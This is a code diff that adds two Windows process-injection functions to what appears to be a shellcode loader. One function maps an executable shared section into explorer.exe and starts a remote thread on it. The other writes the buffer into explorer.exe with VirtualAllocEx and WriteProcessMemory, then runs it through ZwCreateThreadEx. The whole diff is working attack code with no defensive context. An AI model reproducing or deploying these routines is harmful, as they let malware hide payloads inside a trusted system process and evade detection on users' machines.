@@ -412,3 +412,141 @@ BOOL NtMapInjection(LPVOID lpAddress, DWORD dwSize)
     printf("[+] NtMapInjection->Success\n");
     return TRUE;
 }
+
+#pragma comment (lib, "OneCore.lib")
+BOOL MapingInjection(LPVOID lpAddress, DWORD dwSize) {
+    HANDLE hMapping = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, 0, dwSize+1, NULL);
+    if (hMapping)
+    {
+        printf("[+] MapingInjection->CreateFileMappingA->%d\n", hMapping);
+    }
+    else {
+        printf("[+] MapingInjection->CreateFileMappingA->false\n");
+        return FALSE;
+    }
+    LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, 0, 0, dwSize+1);
+    if (lpMapAddress)
+    {
+        printf("[+] MapingInjection->MapViewOfFile->%d\n", lpMapAddress);
+    }
+    else {
+        printf("[+] MapingInjection->MapViewOfFile->false\n");
+        CloseHandle(hMapping);
+        return FALSE;
+    }
+
+    memcpy((PVOID)lpMapAddress, lpAddress, dwSize+1);
+
+    DWORD dwProcessId = GetProcessIdByName(L"explorer.exe");
+    if (dwProcessId)
+    {
+        printf("[+] MapingInjection->GetProcessIdByName->%d\n", dwProcessId);
+    }
+    else {
+        printf("[+] MapingInjection->GetProcessIdByName->false\n");
+        CloseHandle(hMapping);
+        return FALSE;
+    }
+    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
+    if (hProcess)
+    {
+        printf("[+] MapingInjection->hProcess->%d\n", hProcess);
+    }
+    else {
+        printf("[+] MapingInjection->hProcess->false\n");
+        CloseHandle(hMapping);
+        return FALSE;
+    }
+    LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, hProcess, 0, NULL, 0, 0, PAGE_EXECUTE_READ);
+    if (lpMapAddressRemote)
+    {
+        printf("[+] MapingInjection->MapViewOfFile2->%d\n", lpMapAddressRemote);
+    }
+    else {
+        printf("[+] MapingInjection->MapViewOfFile2->false\n");
+        CloseHandle(hProcess);
+        CloseHandle(hMapping);
+        return FALSE;
+    }
+    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, NULL, 0, NULL);
+    if (lpMapAddressRemote)
+    {
+        printf("[+] MapingInjection->CreateRemoteThread->%d\n", hRemoteThread);
+    }
+    else {
+        printf("[+] MapingInjection->CreateRemoteThread->false\n");
+        CloseHandle(hProcess);
+        UnmapViewOfFile(lpMapAddress);
+        CloseHandle(hMapping);
+        return FALSE;
+    }
+
+    UnmapViewOfFile(lpMapAddress);
+    CloseHandle(hMapping);
+    printf("[+] NtMapInjection->Success\n");
+    return TRUE;
+}
+
+BOOL Session0Injection(LPVOID lpAddress, DWORD dwSize) {
+
+
+
+    HANDLE hRemoteThread;
+
+    HMODULE hNtModule = GetModuleHandleA("ntdll.dll");
+
+    typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtModule, "ZwCreateThreadEx");
+    if (ZwCreateThreadEx)
+    {
+        printf("[+] Session0Injection->GetProcAddress->%d\n", ZwCreateThreadEx);
+    }
+    else {
+        printf("[+] Session0Injection->GetProcAddress->false\n");
+        return FALSE;
+    }
+    HANDLE hProcess =OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetProcessIdByName(L"explorer.exe"));
+    if (hProcess)
+    {
+        printf("[+] Session0Injection->OpenProcess->%d\n", hProcess);
+    }
+    else {
+        printf("[+] Session0Injection->OpenProcess->false\n");
+        return FALSE;
+    }
+    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, dwSize+1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    if (lpBaseAddress)
+    {
+        printf("[+] Session0Injection->VirtualAllocEx->%d\n", lpBaseAddress);
+    }
+    else {
+        printf("[+] Session0Injection->VirtualAllocEx->false\n");
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+ 
+    if (WriteProcessMemory(hProcess, lpBaseAddress, lpAddress, dwSize + 1, 0))
+    {
+        printf("[+] Session0Injection->WriteProcessMemory->ture\n");
+    }
+    else {
+        printf("[+] Session0Injection->WriteProcessMemory->false\n");
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+    
+    if (ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)lpBaseAddress, 0, 0, 0, 0, 0, NULL))
+    {
+        printf("[+] Session0Injection->ZwCreateThreadEx->ture\n");
+    }
+    else {
+        printf("[+] Session0Injection->ZwCreateThreadEx->false\n");
+        CloseHandle(hProcess);
+        return FALSE;
+    }
+
+    CloseHandle(hRemoteThread);
+    CloseHandle(hProcess);
+
+    return TRUE;
+
+}
